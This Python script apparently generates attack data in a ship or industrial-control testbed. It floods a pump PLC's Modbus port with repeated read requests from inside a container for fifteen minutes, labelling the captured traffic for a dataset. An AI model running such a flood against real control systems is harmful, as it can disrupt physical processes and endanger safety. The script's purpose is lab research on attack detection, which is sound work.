#!/usr/bin/env python3
"""
T0813 - Modbus DoS: host'tan podman exec ile pump-1 PLC flood
"""
import subprocess, threading, time, struct, socket

DURATION = 900
RECOVERY = 120
OUTPUT = "/root/MaCySTe/grad_rl_data/attack_data.csv"
COLLECTOR = "/root/MaCySTe/macyste_collector.py"
CONTAINER = "macyste-openplc-sgs-pump-1-openplc"

def run_collector(label, duration):
    cmd = ["python3", COLLECTOR, "--label", label,
           "--duration", str(duration), "--output", OUTPUT, "--append"]
    print(f"[COLLECTOR] label={label} duration={duration}s")
    return subprocess.Popen(cmd)

def flood_via_container():
    count = 0
    error_count = 0
    stop = threading.Event()
    end_time = time.time() + DURATION

    def worker():
        nonlocal count, error_count
        while not stop.is_set():
            try:
                result = subprocess.run(
                    ["podman", "exec", CONTAINER, "python3", "-c",
                     "import socket,struct; s=socket.socket(); s.settimeout(0.1); s.connect(('10.1.2.3',502)); s.send(struct.pack('>HHHBB',1,0,6,1,3)+struct.pack('>HH',0,10)); s.close()"],
                    timeout=1, capture_output=True
                )
                if result.returncode == 0:
                    count += 1
                else:
                    error_count += 1
            except Exception:
                error_count += 1

    threads = [threading.Thread(target=worker, daemon=True) for _ in range(3)]
    for t in threads:
        t.start()

    while time.time() < end_time:
        remaining = int(end_time - time.time())
        if remaining % 60 == 0 and remaining > 0:
            print(f"[ATTACK] {count} paket, {error_count} hata, kalan={remaining}s")
        time.sleep(1)

    stop.set()
    for t in threads:
        t.join(timeout=2)
    print(f"[ATTACK] Bitti: {count} paket, {error_count} hata")

print("[T0813] Modbus DoS basliyor (host->container->PLC)...")
collector = run_collector("t0813_modbus_dos", DURATION)
flood_via_container()
collector.wait()
print(f"[RECOVERY] {RECOVERY}s...")
run_collector("recovery", RECOVERY).wait()
print("[DONE]")
